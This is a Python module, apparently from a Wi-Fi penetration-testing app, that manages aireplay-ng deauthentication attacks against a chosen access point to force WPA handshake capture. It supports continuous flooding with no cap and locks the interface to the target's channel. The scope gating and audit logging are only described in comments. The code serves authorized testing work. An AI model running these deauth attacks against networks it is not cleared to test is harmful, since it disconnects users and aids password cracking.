"""Deauthentication against a single scope-authorized AP.

This exists to speed up WPA handshake capture (the client reconnects and the
4-way handshake is recorded by an already-running capture) — the same mechanism
wifite uses. Constraints:

  * one target BSSID at a time, gated on the engagement scope by the API layer
  * the operator sets the packet count themselves (0 = continuous until stopped);
    the run is stoppable now that stop() kills the root process group
  * every run is written to the audit log

It wraps aireplay-ng and requires the interface to be in monitor mode.
"""

import os
import pty
import subprocess
import tempfile
import threading
from dataclasses import dataclass, field
from pathlib import Path
from threading import Lock

from app import procs


class DeauthCommandError(Exception):
    pass


@dataclass
class DeauthState:
    running: bool
    interface: str | None
    bssid: str | None
    client: str | None
    count: int | None
    output: list[str] = field(default_factory=list)


class DeauthManager:
    def __init__(self) -> None:
        self._lock = Lock()
        self._process: subprocess.Popen | None = None
        self._log_fh = None
        self._log_file: Path | None = None
        self._interface: str | None = None
        self._bssid: str | None = None
        self._client: str | None = None
        self._count: int | None = None

    def start(
        self,
        interface: str,
        bssid: str,
        count: int = 8,
        client: str | None = None,
        channel: str | None = None,
    ) -> None:
        with self._lock:
            if self._process and self._process.poll() is None:
                raise RuntimeError("A deauth is already running")
            # 0 = continuous (aireplay --deauth 0) until the operator stops it;
            # any positive number = that many frames. No hard upper cap — the
            # operator chooses, and the run is stoppable.
            if count < 0:
                raise DeauthCommandError("count must be 0 (continuous) or a positive number")
            # aireplay-ng transmits on the interface's CURRENT channel — if that
            # isn't the AP's channel the deauth never reaches it ("wlan1 is on
            # channel X, but the AP uses channel Y"). Lock the interface to the
            # target's channel first.
            if channel:
                subprocess.run(
                    ["sudo", "-n", "iw", "dev", interface, "set", "channel", str(channel).strip()],
                    capture_output=True, timeout=10,
                )
            # aireplay-ng --deauth <count> -a <bssid> [-c <client>] <iface>
            cmd = ["sudo", "-n", "aireplay-ng", "--deauth", str(count), "-a", bssid]
            if client:
                cmd += ["-c", client]
            cmd += ["--ignore-negative-one", interface]

            tmp_dir = Path(tempfile.mkdtemp(prefix="wifideauth_"))
            self._log_file = tmp_dir / "deauth.log"
            # Attach the tool to a pseudo-terminal so it LINE-buffers its output.
            # aireplay-ng (like most stdio tools) block-buffers when stdout is a
            # plain file, so the live log arrived late and in frozen ~4 KB bursts
            # ("stuck"). With a pty it thinks it's on a terminal → flushes per line,
            # and a reader thread drains the pty into the log file in real time.
            master_fd, slave_fd = pty.openpty()
            log_fh = open(self._log_file, "wb")
            self._log_fh = log_fh
            try:
                self._process = procs.popen(cmd, stdout=slave_fd, stderr=slave_fd)
            except FileNotFoundError as exc:
                os.close(master_fd)
                os.close(slave_fd)
                log_fh.close()
                raise DeauthCommandError("Required tool not found: aireplay-ng") from exc
            os.close(slave_fd)  # the child holds its own copy; parent only reads master
            threading.Thread(
                target=self._drain_pty, args=(master_fd, log_fh), daemon=True
            ).start()
            self._interface = interface
            self._bssid = bssid
            self._client = client
            self._count = count

    @staticmethod
    def _drain_pty(master_fd: int, log_fh) -> None:
        """Copy the tool's pty output into the log file, flushing each read so the
        live log updates in real time. Ends (and cleans up) when the tool exits and
        the pty reaches EOF."""
        try:
            while True:
                data = os.read(master_fd, 4096)
                if not data:
                    break
                log_fh.write(data)
                log_fh.flush()
        except OSError:
            pass
        finally:
            try:
                os.close(master_fd)
            except OSError:
                pass
            try:
                log_fh.close()
            except Exception:
                pass

    def stop(self) -> None:
        with self._lock:
            procs.terminate(self._process)  # root-owned (sudo) → killed as root
            # the tool dies → pty EOF → the drain thread flushes + closes the log fh
            self._process = None
            self._log_fh = None

    def is_running(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def status(self) -> DeauthState:
        raw = ""
        if self._log_file and self._log_file.exists():
            raw = self._log_file.read_text(errors="replace")
        lines = [ln for ln in raw.splitlines() if ln.strip()]
        return DeauthState(
            running=self.is_running(),
            interface=self._interface,
            bssid=self._bssid,
            client=self._client,
            count=self._count,
            output=lines[-30:],
        )


deauth_manager = DeauthManager()
